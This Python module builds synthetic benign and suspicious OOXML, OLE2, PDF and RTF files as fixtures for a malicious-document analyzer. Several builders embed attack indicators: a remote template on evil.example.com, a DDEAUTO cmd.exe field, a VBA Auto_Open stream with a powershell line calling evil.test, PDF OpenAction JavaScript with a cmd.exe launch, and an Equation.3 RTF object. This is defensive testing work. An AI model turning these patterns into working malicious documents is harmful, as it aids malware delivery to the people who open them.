"""Builders for synthetic benign + suspicious sample documents.

Every sample is crafted so an analyzer finding fires, but none contain real
malicious payloads. These are structural fixtures only.
"""

from __future__ import annotations

import struct
import zipfile
from io import BytesIO


# ---------------------------------------------------------------------------
# OOXML
# ---------------------------------------------------------------------------

_CONTENT_TYPES = (
    b'<?xml version="1.0"?>'
    b'<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    b'</Types>'
)


def ooxml_benign() -> bytes:
    buf = BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", _CONTENT_TYPES)
        zf.writestr("word/document.xml", b"<w:document>hello world</w:document>")
    return buf.getvalue()


def ooxml_macro() -> bytes:
    buf = BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", _CONTENT_TYPES)
        zf.writestr("word/document.xml", b"<w:document/>")
        zf.writestr("word/vbaProject.bin", b"\x00Attribute VB_Name\x00AutoOpen\x00")
    return buf.getvalue()


def ooxml_template_injection() -> bytes:
    rels = (
        b'<?xml version="1.0"?>'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" '
        b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        b'Target="http://evil.example.com/template.dotm" TargetMode="External"/>'
        b'</Relationships>'
    )
    buf = BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", _CONTENT_TYPES)
        zf.writestr("word/document.xml", b"<w:document/>")
        zf.writestr("word/_rels/settings.xml.rels", rels)
    return buf.getvalue()


def ooxml_dde() -> bytes:
    doc = (
        b"<w:document><w:fldSimple w:instr=\"DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe\">"
        b"</w:fldSimple></w:document>"
    )
    buf = BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", _CONTENT_TYPES)
        zf.writestr("word/document.xml", doc)
    return buf.getvalue()


# ---------------------------------------------------------------------------
# OLE2 compound file
# ---------------------------------------------------------------------------

_SIGNATURE = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"


def ole_with_streams(streams: dict) -> bytes:
    """Build a minimal valid 512-byte-sector OLE2 file holding given streams.

    `streams` maps name -> bytes. All streams are stored in the regular FAT
    (never the mini stream) to keep the builder simple; sizes are padded to a
    512-byte sector boundary.
    """
    sector = 512
    header = bytearray(sector)
    header[0:8] = _SIGNATURE
    struct.pack_into("<H", header, 24, 0x003E)   # minor version
    struct.pack_into("<H", header, 26, 0x0003)   # major version (v3 = 512)
    struct.pack_into("<H", header, 28, 0xFFFE)   # byte order
    struct.pack_into("<H", header, 30, 9)        # sector shift (2^9 = 512)
    struct.pack_into("<H", header, 32, 6)        # mini sector shift (2^6 = 64)
    struct.pack_into("<I", header, 44, 1)        # number of FAT sectors
    # dir_start (48) and others filled after layout is known.
    # Mini-stream cutoff of 0 forces every stream into the regular FAT, which
    # keeps this fixture builder simple (no mini-FAT needed). The parser honors
    # whatever cutoff the header declares.
    struct.pack_into("<I", header, 56, 0)        # mini stream cutoff
    struct.pack_into("<I", header, 60, 0xFFFFFFFE)  # minifat start = ENDOFCHAIN
    struct.pack_into("<I", header, 64, 0)        # num minifat sectors
    struct.pack_into("<I", header, 68, 0xFFFFFFFE)  # difat start = ENDOFCHAIN
    struct.pack_into("<I", header, 72, 0)        # num difat sectors

    ENDOFCHAIN = 0xFFFFFFFE
    FREESECT = 0xFFFFFFFF
    FATSECT = 0xFFFFFFFD

    # Layout plan:
    #   sector 0        = FAT
    #   sector 1        = directory
    #   sectors 2..     = stream data (each stream padded to sector multiple)
    stream_items = list(streams.items())
    stream_layout = []  # (name, start_sector, n_sectors, size)
    next_sector = 2
    for name, data in stream_items:
        n_sectors = max(1, (len(data) + sector - 1) // sector)
        stream_layout.append((name, next_sector, n_sectors, len(data)))
        next_sector += n_sectors
    total_sectors = next_sector  # sectors 0..next_sector-1

    # Build FAT (one sector = 128 entries).
    fat = [FREESECT] * 128
    fat[0] = FATSECT          # sector 0 is the FAT itself
    fat[1] = ENDOFCHAIN       # directory sector chain (single sector)
    for _name, start, n, _size in stream_layout:
        for i in range(n):
            s = start + i
            fat[s] = ENDOFCHAIN if i == n - 1 else s + 1

    # Directory: root entry + one entry per stream (128 bytes each).
    def dir_entry(name: str, etype: int, start: int, size: int, child=0xFFFFFFFF,
                  left=0xFFFFFFFF, right=0xFFFFFFFF) -> bytes:
        e = bytearray(128)
        nb = name.encode("utf-16-le") + b"\x00\x00"
        nb = nb[:64]
        e[0:len(nb)] = nb
        struct.pack_into("<H", e, 64, len(nb))
        e[66] = etype  # 1 storage, 2 stream, 5 root
        e[67] = 1      # color = black
        struct.pack_into("<I", e, 68, left)
        struct.pack_into("<I", e, 72, right)
        struct.pack_into("<I", e, 76, child)
        struct.pack_into("<I", e, 116, start)
        struct.pack_into("<I", e, 120, size & 0xFFFFFFFF)
        struct.pack_into("<I", e, 124, (size >> 32) & 0xFFFFFFFF)
        return bytes(e)

    dir_sector = bytearray()
    # Root storage: child points to first stream entry (index 1) if any.
    root_child = 1 if stream_layout else 0xFFFFFFFF
    dir_sector += dir_entry("Root Entry", 5, 0xFFFFFFFE, 0, child=root_child)
    for idx, (name, start, _n, size) in enumerate(stream_layout):
        # Chain siblings via right pointer for a valid-enough tree.
        right = (idx + 2) if idx + 1 < len(stream_layout) else 0xFFFFFFFF
        dir_sector += dir_entry(name, 2, start, size, right=right)
    # Pad directory to a full sector.
    dir_sector += b"\x00" * (sector - (len(dir_sector) % sector) if len(dir_sector) % sector else 0)

    struct.pack_into("<I", header, 48, 1)  # directory start sector = 1

    # Assemble the file image.
    image = bytearray()
    image += header
    # sector 0 : FAT
    fat_bytes = b"".join(struct.pack("<I", v) for v in fat)
    image += fat_bytes.ljust(sector, b"\x00")
    # sector 1 : directory
    image += bytes(dir_sector).ljust(sector, b"\x00")
    # stream data sectors
    for (name, _start, n, _size), (_n2, data) in zip(stream_layout, stream_items):
        padded = data.ljust(n * sector, b"\x00")
        image += padded

    return bytes(image)


def ole_macro() -> bytes:
    return ole_with_streams({
        "VBA": b"placeholder",
        "Module1": b"Attribute VB_Name\x00Auto_Open\x00Shell\x00powershell http://evil.test/x",
        "_VBA_PROJECT": b"\x00\x00vba project",
    })


def ole_benign() -> bytes:
    return ole_with_streams({
        "WordDocument": b"benign content here",
        "SummaryInformation": b"title: report",
    })


# ---------------------------------------------------------------------------
# PDF
# ---------------------------------------------------------------------------

def pdf_benign() -> bytes:
    return (
        b"%PDF-1.5\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Count 0 >>\nendobj\n"
        b"trailer\n<< /Root 1 0 R >>\n%%EOF\n"
    )


def pdf_malicious() -> bytes:
    return (
        b"%PDF-1.7\n"
        b"1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /S /JavaScript /JS (app.alert\\(1\\);) >>\nendobj\n"
        b"3 0 obj\n<< /S /Launch /F (cmd.exe) >>\nendobj\n"
        b"trailer\n<< /Root 1 0 R >>\n%%EOF\n"
    )


def pdf_obfuscated_js() -> bytes:
    # /JavaScript written with a hex-escaped 'J' -> /#4aavaScript
    return (
        b"%PDF-1.7\n"
        b"1 0 obj\n<< /S /#4aavaScript /#4aS (x) >>\nendobj\n"
        b"trailer\n<< /Root 1 0 R >>\n%%EOF\n"
    )


# ---------------------------------------------------------------------------
# RTF
# ---------------------------------------------------------------------------

def rtf_benign() -> bytes:
    return b"{\\rtf1\\ansi\\deff0 {\\fonttbl {\\f0 Times;}} Hello world.}"


def rtf_malicious() -> bytes:
    hexblob = b"01050000020000000b0000004571756174696f6e2e33" + b"00" * 200
    return (
        b"{\\rtf1\\ansi"
        b"{\\object\\objemb\\objupdate\\objclass Equation.3"
        b"{\\*\\objdata " + hexblob + b"}}"
        b" visit http://malware.example.com/payload }"
    )
